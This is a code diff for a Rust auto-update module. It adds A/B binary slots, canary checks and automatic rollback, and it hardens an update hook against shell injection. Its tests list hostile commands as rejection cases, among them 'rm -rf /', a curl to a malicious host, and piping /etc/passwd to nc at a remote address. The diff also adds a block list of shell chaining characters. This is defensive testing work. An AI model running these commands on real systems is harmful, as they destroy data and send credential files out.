@@ -1,8 +1,19 @@
 //! Auto-update checks for Xavier releases and silent tracking of the main branch.
+//!
+//! Includes Blue-Green binary slots (A/B), pre-flight canary sandbox validation,
+//! ETXTBSY protection, and autonomous Rollback Sentinel with a 30s Health Gate.
 
-use anyhow::{Context, Result};
+pub mod sentinel;
+pub mod slots;
+
+pub use sentinel::{
+    HealthGateDecision, RollbackSentinel, SentinelConfig, SentinelState, SentinelStatus,
+};
+pub use slots::{BinarySlot, CanaryReport, SlotConfig, SlotManager, SwapMode};
+
+use anyhow::{anyhow, Context, Result};
 use serde::{Deserialize, Serialize};
-use std::path::PathBuf;
+use std::path::{Path, PathBuf};
 use std::time::Duration;
 use tracing::{info, warn};
 
@@ -41,6 +52,8 @@ pub struct AutoUpdateService {
     latest_release_url: String,
     repo: String,
     branch: String,
+    slot_manager: Option<SlotManager>,
+    sentinel: Option<RollbackSentinel>,
 }
 
 #[derive(Debug, Clone, PartialEq, Eq)]
@@ -110,7 +123,28 @@ impl AutoUpdateService {
             latest_release_url: GITHUB_LATEST_RELEASE_URL.to_string(),
             repo,
             branch,
+            slot_manager: None,
+            sentinel: None,
         }
+    }
+
+    /// Attach SlotManager and RollbackSentinel for Blue-Green atomic swap and health gating.
+    pub fn with_resilience(
+        mut self,
+        slot_manager: SlotManager,
+        sentinel: RollbackSentinel,
+    ) -> Self {
+        self.slot_manager = Some(slot_manager);
+        self.sentinel = Some(sentinel);
+        self
+    }
+
+    pub fn slot_manager(&self) -> Option<&SlotManager> {
+        self.slot_manager.as_ref()
+    }
+
+    pub fn sentinel(&self) -> Option<&RollbackSentinel> {
+        self.sentinel.as_ref()
     }
 
     /// Set a custom release URL (e.g. for testing).
@@ -252,13 +286,49 @@ impl AutoUpdateService {
     pub async fn apply_silent_update(&self, commit: &MainCommitInfo) -> Result<SilentUpdateReport> {
         let previous_sha = get_last_known_sha();
 
-        // If a custom update hook is defined, run it in background
+        // If resilient SlotManager and Sentinel are attached, perform staged canary check and atomic swap
+        if let (Some(slot_mgr), Some(sentinel)) = (&self.slot_manager, &self.sentinel) {
+            if let Ok(cand_path_str) = std::env::var("XAVIER_UPDATE_CANDIDATE_PATH") {
+                let cand_path = PathBuf::from(cand_path_str);
+                if cand_path.exists() {
+                    info!(
+                        "AutoUpdateService: Verifying pre-flight canary in sandbox for {:?}",
+                        cand_path
+                    );
+                    let canary = slot_mgr.verify_binary_preflight(
+                        &cand_path,
+                        &["--version"],
+                        Duration::from_secs(5),
+                    )?;
+                    info!(
+                        "AutoUpdateService: Canary pre-flight PASSED in {}ms",
+                        canary.duration_ms
+                    );
+
+                    let cand_slot = slot_mgr.candidate_slot()?;
+                    let active_slot = slot_mgr.detect_active_slot()?;
+
+                    // Arm Sentinel in probation
+                    sentinel.start_probation(
+                        &commit.sha,
+                        previous_sha.as_deref().unwrap_or("unknown"),
+                        active_slot.as_str(),
+                        cand_slot.as_str(),
+                    )?;
+
+                    // Atomic swap to candidate slot
+                    slot_mgr.atomic_swap(&cand_path, cand_slot)?;
+                    info!(
+                        "AutoUpdateService: Atomic swap completed into slot {:?}",
+                        cand_slot
+                    );
+                }
+            }
+        }
+
+        // If a custom update hook is defined, run it safely in background (SEC-03)
         if let Ok(hook_cmd) = std::env::var("XAVIER_UPDATE_HOOK") {
-            info!("Executing custom update hook: {}", hook_cmd);
-            let _ = std::process::Command::new("sh")
-                .arg("-c")
-                .arg(&hook_cmd)
-                .spawn();
+            Self::execute_update_hook(&hook_cmd);
         }
 
         // Format user-friendly notification message with improvements and details link
@@ -313,8 +383,100 @@ impl AutoUpdateService {
         })
     }
 
+    /// Executes an immediate startup check without waiting for the periodic cycle.
+    ///
+    /// 1. Inspects Sentinel state for any pending probation (e.g. node restarted into candidate binary).
+    ///    Runs the 30-second Health Gate immediately. If healthy -> commits; if unhealthy -> rolls back autonomously.
+    /// 2. Verifies Sentinel quarantine: if active, suppresses update checks during cooldown.
+    /// 3. If clear, immediately queries main branch / releases for pending updates.
+    pub async fn run_startup_check(&self) -> Result<SilentUpdateReport> {
+        // 1. Check Sentinel quarantine
+        if let Some(sentinel) = &self.sentinel {
+            if sentinel.is_quarantined() {
+                warn!("AutoUpdateService: Update check skipped due to active Sentinel quarantine cooldown");
+                let last_sha = get_last_known_sha();
+                return Ok(SilentUpdateReport {
+                    status: "quarantined".to_string(),
+                    applied: false,
+                    previous_sha: last_sha.clone(),
+                    current_sha: last_sha.unwrap_or_default(),
+                    title: "Actualizaciones suspendidas por cuarentena de fallos".to_string(),
+                    improvements: vec![],
+                    commit_url: String::new(),
+                    notification_sent: false,
+                });
+            }
+
+            // 2. Check if a newly restarted binary is in probation (30s health gate)
+            let state = sentinel.load_state();
+            if state.status == SentinelStatus::InProbation {
+                info!(
+                    "AutoUpdateService: Startup check detected candidate {} in probation. Executing Health Gate...",
+                    state.candidate_sha
+                );
+                if let Some(slot_mgr) = &self.slot_manager {
+                    let port = std::env::var("PORT").unwrap_or_else(|_| "8006".to_string());
+                    let health_url = format!("http://127.0.0.1:{}/health", port);
+                    let client = self.client.clone();
+
+                    let decision = sentinel
+                        .supervise_health_gate(slot_mgr, || {
+                            let url = health_url.clone();
+                            let cl = client.clone();
+                            async move {
+                                match cl.get(&url).send().await {
+                                    Ok(resp) => Ok(resp.status().is_success()),
+                                    Err(e) => Err(anyhow!("Health probe failed: {}", e)),
+                                }
+                            }
+                        })
+                        .await?;
+
+                    match decision {
+                        HealthGateDecision::Committed { sha } => {
+                            info!("AutoUpdateService: Candidate {} committed at startup!", sha);
+                        }
+                        HealthGateDecision::RolledBack {
+                            sha,
+                            target_slot,
+                            reason,
+                        } => {
+                            warn!(
+                                "AutoUpdateService: Candidate {} rolled back to {}! Reason: {}",
+                                sha, target_slot, reason
+                            );
+                        }
+                        _ => {}
+                    }
+                }
+            }
+        }
+
+        // 3. Immediately run silent update cycle
+        self.run_silent_update_cycle().await
+    }
+
     /// Execute a full cycle: check main, apply update if present, and notify.
     pub async fn run_silent_update_cycle(&self) -> Result<SilentUpdateReport> {
+        // If Sentinel is in active quarantine, abort cycle early
+        if let Some(sentinel) = &self.sentinel {
+            if sentinel.is_quarantined() {
+                warn!("AutoUpdateService: Silent update cycle suppressed (quarantine active)");
+                let last_sha = get_last_known_sha();
+                return Ok(SilentUpdateReport {
+                    status: "quarantined".to_string(),
+                    applied: false,
+                    previous_sha: last_sha.clone(),
+                    current_sha: last_sha.unwrap_or_default(),
+                    title: "Actualizaciones en pausa por fallas previas (quarantine activo)"
+                        .to_string(),
+                    improvements: vec![],
+                    commit_url: format!("https://github.com/{}/tree/{}", self.repo, self.branch),
+                    notification_sent: false,
+                });
+            }
+        }
+
         let last_sha = get_last_known_sha();
 
         match self.check_main_branch().await {
@@ -332,11 +494,145 @@ impl AutoUpdateService {
             Err(e) => Err(e),
         }
     }
+
+    /// Safely executes a custom update hook command.
+    ///
+    /// Eliminates raw shell string injection (SEC-03) by rejecting dangerous shell
+    /// chaining metacharacters, tokenizing into program and arguments respecting quotes,
+    /// and spawning the process directly without an intermediary shell.
+    pub fn execute_update_hook(hook_cmd: &str) -> Option<u32> {
+        execute_update_hook(hook_cmd)
+    }
 }
 
 impl Default for AutoUpdateService {
     fn default() -> Self {
         Self::new()
+    }
+}
+
+/// Dangerous shell chaining metacharacters rejected to prevent command injection (SEC-03).
+pub const DANGEROUS_SHELL_METACHARS: &[&str] = &[";", "&&", "||", "|", "`", "$("];
+
+/// Validates that `hook_cmd` does not contain dangerous shell chaining metacharacters
+/// and tokenizes it into program and argument tokens respecting quotes.
+pub fn validate_and_tokenize_hook(hook_cmd: &str) -> Result<Vec<String>, String> {
+    let trimmed = hook_cmd.trim();
+    if trimmed.is_empty() {
+        return Err("Hook command string is empty".to_string());
+    }
+
+    for metachar in DANGEROUS_SHELL_METACHARS {
+        if trimmed.contains(metachar) {
+            return Err(format!(
+                "dangerous shell metacharacter '{}' detected",
+                metachar
+            ));
+        }
+    }
+
+    tokenize_command(trimmed)
+}
+
+/// Tokenizes a command line string into program and arguments respecting single and double quotes.
+pub fn tokenize_command(cmd: &str) -> Result<Vec<String>, String> {
+    let mut tokens = Vec::new();
+    let mut current = String::new();
+    let mut in_token = false;
+    let mut in_single_quote = false;
+    let mut in_double_quote = false;
+    let mut chars = cmd.chars().peekable();
+
+    while let Some(c) = chars.next() {
+        match c {
+            '\\' if !in_single_quote => {
+                in_token = true;
+                if let Some(next_c) = chars.next() {
+                    current.push(next_c);
+                } else {
+                    current.push('\\');
+                }
+            }
+            '\'' if !in_double_quote => {
+                in_token = true;
+                in_single_quote = !in_single_quote;
+            }
+            '"' if !in_single_quote => {
+                in_token = true;
+                in_double_quote = !in_double_quote;
+            }
+            c if c.is_whitespace() && !in_single_quote && !in_double_quote => {
+                if in_token {
+                    tokens.push(std::mem::take(&mut current));
+                    in_token = false;
+                }
+            }
+            c => {
+                in_token = true;
+                current.push(c);
+            }
+        }
+    }
+
+    if in_single_quote || in_double_quote {
+        return Err("Unclosed quote in command string".to_string());
+    }
+
+    if in_token {
+        tokens.push(current);
+    }
+
+    if tokens.is_empty() {
+        return Err("Empty command string".to_string());
+    }
+
+    Ok(tokens)
+}
+
+/// Safely executes an update hook command without invoking an intermediary shell.
+/// Rejects commands containing shell chaining metacharacters, tokenizes arguments,
+/// and executes the program directly with its argument slice.
+pub fn execute_update_hook(hook_cmd: &str) -> Option<u32> {
+    match validate_and_tokenize_hook(hook_cmd) {
+        Ok(tokens) => {
+            let program = &tokens[0];
+            let args = &tokens[1..];
+            info!(
+                "Executing custom update hook: program='{}', arg_count={}, args={:?}",
+                program,
+                args.len(),
+                args
+            );
+
+            match std::process::Command::new(program).args(args).spawn() {
+                Ok(child) => {
+                    let child_pid = child.id();
+                    info!(
+                        "Update hook spawned successfully: program='{}', arg_count={}, child_pid={}",
+                        program,
+                        args.len(),
+                        child_pid
+                    );
+                    Some(child_pid)
+                }
+                Err(err) => {
+                    warn!(
+                        "Failed to spawn custom update hook program '{}' (arg_count={}): {}",
+                        program,
+                        args.len(),
+                        err
+                    );
+                    None
+                }
+            }
+        }
+        Err(err) => {
+            warn!(
+                "XAVIER_UPDATE_HOOK rejected: {}: hook_cmd='{}'",
+                err, hook_cmd
+            );
+            None
+        }
     }
 }
 
@@ -467,6 +763,9 @@ fn check_local_git_head(repo: &str) -> Option<MainCommitInfo> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use std::fs;
+    #[cfg(unix)]
+    use std::os::unix::fs::PermissionsExt;
 
     #[test]
     fn test_parse_improvements() {
@@ -528,5 +827,303 @@ mod tests {
             report.commit_url,
             "https://github.com/southwest-ai-labs/xavier/commit/fe4125ca7abcdef1234567890"
         );
+    }
+
+    #[test]
+    fn test_slots_blue_green_swap_etxtbsy_protection() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let slot_mgr = SlotManager::new(temp_dir.path(), "xavier").unwrap();
+
+        // 1. Initial state: populate slot_a with version 1
+        let slot_a_bin = slot_mgr.slot_binary_path(BinarySlot::SlotA);
+        fs::write(&slot_a_bin, b"#!/bin/sh\necho 'xavier v0.2.20'\n").unwrap();
+        #[cfg(unix)]
+        fs::set_permissions(&slot_a_bin, fs::Permissions::from_mode(0o755)).unwrap();
+
+        // Symlink active pointer to slot_a
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(&slot_a_bin, slot_mgr.active_binary_path()).unwrap();
+
+        assert_eq!(slot_mgr.detect_active_slot().unwrap(), BinarySlot::SlotA);
+        assert_eq!(slot_mgr.candidate_slot().unwrap(), BinarySlot::SlotB);
+
+        // 2. Simulate running process holding open file descriptor to active binary (triggers ETXTBSY on write)
+        let _running_file_handle = fs::File::open(slot_mgr.active_binary_path()).unwrap();
+
+        // 3. Stage candidate binary for slot_b with sha256 checksum
+        let cand_bytes = b"#!/bin/sh\necho 'xavier v0.2.21'\n";
+        use sha2::{Digest, Sha256};
+        let mut hasher = Sha256::new();
+        hasher.update(cand_bytes);
+        let expected_sha: String = hasher
+            .finalize()
+            .into_iter()
+            .map(|b| format!("{:02x}", b))
+            .collect();
+
+        let staged = slot_mgr
+            .stage_binary(cand_bytes, Some(&expected_sha))
+            .unwrap();
+        assert!(staged.exists());
+
+        // 4. Pre-flight canary check
+        let canary = slot_mgr
+            .verify_binary_preflight(&staged, &[], Duration::from_secs(3))
+            .unwrap();
+        assert!(canary.success);
+        assert!(canary.stdout.contains("xavier v0.2.21"));
+
+        // 5. Execute atomic swap into slot_b
+        // Must succeed without ETXTBSY despite running file handle being held open!
+        let swapped_path = slot_mgr.atomic_swap(&staged, BinarySlot::SlotB).unwrap();
+        assert_eq!(swapped_path, slot_mgr.slot_binary_path(BinarySlot::SlotB));
+
+        // 6. Verify active pointer now targets slot_b
+        assert_eq!(slot_mgr.detect_active_slot().unwrap(), BinarySlot::SlotB);
+        assert_eq!(slot_mgr.candidate_slot().unwrap(), BinarySlot::SlotA);
+
+        // Verify backup symlink was generated
+        assert!(slot_mgr.backup_binary_path().exists());
+    }
+
+    #[test]
+    fn test_canary_preflight_rejection_of_corrupt_binary() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let slot_mgr = SlotManager::new(temp_dir.path(), "xavier").unwrap();
+
+        // Stage corrupt binary that crashes on boot (exit 42)
+        let corrupt_bytes = b"#!/bin/sh\necho 'Fatal: segmentation fault' >&2\nexit 42\n";
+        let staged = slot_mgr.stage_binary(corrupt_bytes, None).unwrap();
+
+        // Canary pre-flight must reject it
+        let result = slot_mgr.verify_binary_preflight(&staged, &[], Duration::from_secs(3));
+        assert!(result.is_err());
+        let err_msg = result.unwrap_err().to_string();
+        assert!(err_msg.contains("Canary pre-flight check failed"));
+        assert!(err_msg.contains("code Some(42)"));
+    }
+
+    #[tokio::test]
+    async fn test_sentinel_health_gate_success_commits_update() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let slot_mgr = SlotManager::new(temp_dir.path(), "xavier").unwrap();
+
+        let sentinel_config = SentinelConfig {
+            state_file: temp_dir.path().join("sentinel.json"),
+            health_gate_duration: Duration::from_secs(5),
+            poll_interval: Duration::from_millis(50),
+            max_consecutive_failures: 3,
+            quarantine_duration: Duration::from_secs(3600),
+        };
+        let sentinel = RollbackSentinel::with_config(sentinel_config);
+
+        // Arm probation
+        sentinel
+            .start_probation("commit_sha_new", "commit_sha_old", "slot_a", "slot_b")
+            .unwrap();
+
+        let state = sentinel.load_state();
+        assert_eq!(state.status, SentinelStatus::InProbation);
+
+        // Simulate health probe that returns HTTP 200 OK
+        let decision = sentinel
+            .supervise_health_gate(&slot_mgr, || async { Ok(true) })
+            .await
+            .unwrap();
+
+        assert_eq!(
+            decision,
+            HealthGateDecision::Committed {
+                sha: "commit_sha_new".to_string()
+            }
+        );
+
+        let final_state = sentinel.load_state();
+        assert_eq!(final_state.status, SentinelStatus::Committed);
+        assert_eq!(final_state.consecutive_failures, 0);
+    }
+
+    #[tokio::test]
+    async fn test_sentinel_health_gate_autonomous_rollback_on_failure() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let slot_mgr = SlotManager::new(temp_dir.path(), "xavier").unwrap();
+
+        // Setup slot_a as active and slot_b as candidate
+        let slot_a_bin = slot_mgr.slot_binary_path(BinarySlot::SlotA);
+        fs::write(&slot_a_bin, b"#!/bin/sh\necho 'xavier v0.2.20'\n").unwrap();
+        #[cfg(unix)]
+        fs::set_permissions(&slot_a_bin, fs::Permissions::from_mode(0o755)).unwrap();
+
+        #[cfg(unix)]
+        std::os::unix::fs::symlink(&slot_a_bin, slot_mgr.active_binary_path()).unwrap();
+
+        // Now swap into slot_b
+        let slot_b_bytes = b"#!/bin/sh\necho 'broken candidate'\n";
+        let staged = slot_mgr.stage_binary(slot_b_bytes, None).unwrap();
+        slot_mgr.atomic_swap(&staged, BinarySlot::SlotB).unwrap();
+        assert_eq!(slot_mgr.detect_active_slot().unwrap(), BinarySlot::SlotB);
+
+        // Arm sentinel probation for slot_b candidate
+        let sentinel_config = SentinelConfig {
+            state_file: temp_dir.path().join("sentinel.json"),
+            health_gate_duration: Duration::from_millis(200),
+            poll_interval: Duration::from_millis(50),
+            max_consecutive_failures: 3,
+            quarantine_duration: Duration::from_secs(3600),
+        };
+        let sentinel = RollbackSentinel::with_config(sentinel_config);
+        sentinel
+            .start_probation("broken_sha", "old_good_sha", "slot_b", "slot_a")
+            .unwrap();
+
+        // Simulate health probe failing (HTTP 500 or timeout)
+        let decision = sentinel
+            .supervise_health_gate(&slot_mgr, || async { Ok(false) })
+            .await
+            .unwrap();
+
+        match decision {
+            HealthGateDecision::RolledBack {
+                sha, target_slot, ..
+            } => {
+                assert_eq!(sha, "broken_sha");
+                assert_eq!(target_slot, "slot_a");
+            }
+            other => panic!("Expected RolledBack decision, got {:?}", other),
+        }
+
+        // Verify autonomous rollback reverted active pointer back to slot_a!
+        assert_eq!(slot_mgr.detect_active_slot().unwrap(), BinarySlot::SlotA);
+        let final_state = sentinel.load_state();
+        assert_eq!(final_state.status, SentinelStatus::RolledBack);
+        assert_eq!(final_state.consecutive_failures, 1);
+    }
+
+    #[tokio::test]
+    async fn test_sentinel_circuit_breaker_quarantine_tripping() {
+        let temp_dir = tempfile::tempdir().unwrap();
+        let slot_mgr = SlotManager::new(temp_dir.path(), "xavier").unwrap();
+
+        let sentinel_config = SentinelConfig {
+            state_file: temp_dir.path().join("sentinel.json"),
+            health_gate_duration: Duration::from_millis(100),
+            poll_interval: Duration::from_millis(30),
+            max_consecutive_failures: 3,
+            quarantine_duration: Duration::from_secs(3600),
+        };
+        let sentinel = RollbackSentinel::with_config(sentinel_config);
+
+        // Setup dummy backup file for rollback
+        fs::write(slot_mgr.backup_binary_path(), b"good binary").unwrap();
+
+        // Simulate 3 consecutive rollbacks
+        for i in 1..=3 {
+            sentinel
+                .start_probation(&format!("fail_sha_{}", i), "old_sha", "slot_b", "slot_a")
+                .unwrap();
+
+            let decision = sentinel
+                .supervise_health_gate(&slot_mgr, || async { Ok(false) })
+                .await
+                .unwrap();
+
+            if i < 3 {
+                assert!(matches!(decision, HealthGateDecision::RolledBack { .. }));
+            } else {
+                // On 3rd failure, circuit breaker must trip to Quarantined!
+                match decision {
+                    HealthGateDecision::Quarantined {
+                        consecutive_failures,
+                        ..
+                    } => {
+                        assert_eq!(consecutive_failures, 3);
+                    }
+                    other => panic!("Expected Quarantined on 3rd failure, got {:?}", other),
+                }
+            }
+        }
+
+        assert!(sentinel.is_quarantined());
+
+        // AutoUpdateService with quarantined sentinel returns quarantined report
+        let service = AutoUpdateService::new().with_resilience(slot_mgr, sentinel);
+        let report = service.run_startup_check().await.unwrap();
+        assert_eq!(report.status, "quarantined");
+        assert!(!report.applied);
+    }
+
+    #[test]
+    fn test_update_hook_metacharacter_rejection() {
+        let dangerous_commands = [
+            "systemctl restart xavier; rm -rf /",
+            "echo update && curl http://malicious.com",
+            "echo update || cat /etc/passwd",
+            "cat /etc/passwd | nc 1.2.3.4 9999",
+            "echo `whoami`",
+            "echo $(whoami)",
+            "test;ls",
+            "test&&ls",
+            "test||ls",
+            "test|ls",
+        ];
+
+        for cmd in dangerous_commands {
+            let res = validate_and_tokenize_hook(cmd);
+            assert!(
+                res.is_err(),
+                "Expected rejection of dangerous command: {}",
+                cmd
+            );
+            let pid = execute_update_hook(cmd);
+            assert!(
+                pid.is_none(),
+                "Expected execute_update_hook to return None for: {}",
+                cmd
+            );
+        }
+    }
+
+    #[test]
+    fn test_update_hook_tokenization_and_quotes() {
+        let cmd = r#"systemctl restart "xavier-daemon" --mode 'fast' --dry-run"#;
+        let tokens = validate_and_tokenize_hook(cmd).unwrap();
+        assert_eq!(
+            tokens,
+            vec![
+                "systemctl",
+                "restart",
+                "xavier-daemon",
+                "--mode",
+                "fast",
+                "--dry-run"
+            ]
+        );
+
+        // Test unclosed quotes
+        assert!(validate_and_tokenize_hook(r#"echo "unclosed"#).is_err());
+        assert!(validate_and_tokenize_hook(r#"echo 'unclosed"#).is_err());
+
+        // Test empty strings
+        assert!(validate_and_tokenize_hook("").is_err());
+        assert!(validate_and_tokenize_hook("   \t  \n ").is_err());
+    }
+
+    #[test]
+    fn test_update_hook_safe_execution() {
+        #[cfg(unix)]
+        {
+            let pid = execute_update_hook("true");
+            assert!(pid.is_some(), "Expected 'true' to spawn successfully");
+
+            let pid_with_args = execute_update_hook("echo 'Update hook executed successfully'");
+            assert!(
+                pid_with_args.is_some(),
+                "Expected 'echo' with args to spawn successfully"
+            );
+        }
+
+        // Non-existent binary should gracefully return None
+        let pid_missing = execute_update_hook("non_existent_binary_xyz_12345 --flag");
+        assert!(pid_missing.is_none());
     }
 }
